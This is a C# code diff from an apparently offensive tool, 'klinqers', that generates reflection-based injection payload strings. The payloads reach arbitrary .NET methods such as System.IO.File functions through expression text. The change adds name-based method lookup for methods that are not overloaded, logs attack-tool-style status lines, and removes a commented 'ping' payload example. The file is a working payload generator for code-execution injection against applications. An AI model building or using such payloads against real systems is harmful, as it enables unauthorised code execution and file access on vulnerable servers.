@@ -13,6 +13,7 @@ namespace klinqers
         public string strMethodPart;
         public string strTypePart;
         public Type parameterType = null;
+        public bool bRequirePosition = true; // If false then we have no polymorphism for the function
 
         static string findSuitableSplitter(List<string> lstValues)
         {
@@ -61,7 +62,12 @@ namespace klinqers
 
         string getCall()
         {
-            return $"\"\".GetType().Assembly.GetType(\"{type.ToString()}\").GetMethods()[{methodPosition}]";
+            if (this.bRequirePosition)
+            {
+                return $"\"\".GetType().Assembly.GetType(\"{type.ToString()}\").GetMethods()[{methodPosition}]";
+            }
+
+            return $"\"\".GetType().Assembly.GetType(\"{type.ToString()}\").GetMethod(\"{strMethodPart}\")";
         }
 
         string getInvokeContent(List<string> lstValues)
@@ -93,6 +99,19 @@ namespace klinqers
                 strMethodPart = strMethodPart,
                 strTypePart = strType
             };
+
+            // Check if we really need the method position
+            try
+            {
+                MethodInfo minfSingle = t.GetMethod(strMethodPart);
+                callMethod.bRequirePosition = false;
+
+                Console.WriteLine($"[+] Method {strMethodName} can be called without knowing the exact position of it in the class");
+            }
+            catch(System.Reflection.AmbiguousMatchException ex)
+            {
+                Console.WriteLine($"[+] Method {strMethodName} is probably polymorph ({ex.Message}), hence, we require the exact position of the function to call it.");
+            }
 
             for (int x = 0; x < minf.Length; x++)
             {
@@ -152,12 +171,11 @@ namespace klinqers
             if (parameterType == typeof(String))
             {
                 // "".GetType().Assembly.GetType("System.IO.File").GetMethods()[37].Invoke(null,"fff;#ccc###".Split(";".ToCharArray()))).ToString()
-                //"ping;8.8.8.8".Split(";".ToCharArray())
 
                 string strInvokeContent = getInvokeContent(lstValues);
                 string strCall = getCall();
 
-                string strRetval = $"{strCall}.Invoke({strInvokeContent}).ToString()";
+                string strRetval = $"{strCall}.Invoke({strInvokeContent})";
 
                 return strRetval;
             }
